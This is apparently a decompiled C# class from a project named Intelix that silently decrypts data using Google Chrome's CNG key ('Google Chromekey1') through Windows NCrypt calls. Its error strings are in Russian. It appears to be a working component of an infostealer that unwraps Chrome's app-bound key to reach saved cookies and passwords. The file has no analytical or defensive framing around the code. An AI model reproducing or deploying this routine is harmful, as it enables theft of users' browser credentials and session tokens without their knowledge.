using System;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000071 RID: 113
	public static class CngDecryptor
	{
		// Token: 0x060001C1 RID: 449 RVA: 0x00016268 File Offset: 0x00014468
		public static byte[] Decrypt(byte[] inputData, string providerName = "Microsoft Software Key Storage Provider", string keyName = "Google Chromekey1")
		{
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			byte[] result;
			try
			{
				int num = NativeMethods.NCryptOpenStorageProvider(out zero, providerName, 0);
				bool flag = num != 0;
				if (flag)
				{
					throw new Exception(string.Format("Ошибка NCryptOpenStorageProvider: Код {0}", num));
				}
				num = NativeMethods.NCryptOpenKey(zero, out zero2, keyName, 0, 0);
				bool flag2 = num != 0;
				if (flag2)
				{
					throw new Exception(string.Format("Ошибка NCryptOpenKey: Код {0}", num));
				}
				int num2;
				num = NativeMethods.NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, null, 0, out num2, 64);
				bool flag3 = num != 0;
				if (flag3)
				{
					throw new Exception(string.Format("Ошибка определения размера NCryptDecrypt: Код {0}", num));
				}
				byte[] array = new byte[num2];
				num = NativeMethods.NCryptDecrypt(zero2, inputData, inputData.Length, IntPtr.Zero, array, array.Length, out num2, 64);
				bool flag4 = num != 0;
				if (flag4)
				{
					throw new Exception(string.Format("Ошибка NCryptDecrypt: Код {0}", num));
				}
				Array.Resize<byte>(ref array, num2);
				result = array;
			}
			finally
			{
				bool flag5 = zero2 != IntPtr.Zero;
				if (flag5)
				{
					NativeMethods.NCryptFreeObject(zero2);
				}
				bool flag6 = zero != IntPtr.Zero;
				if (flag6)
				{
					NativeMethods.NCryptFreeObject(zero);
				}
			}
			return result;
		}

		// Token: 0x0400005F RID: 95
		private const int NCRYPT_SILENT_FLAG = 64;
	}
}
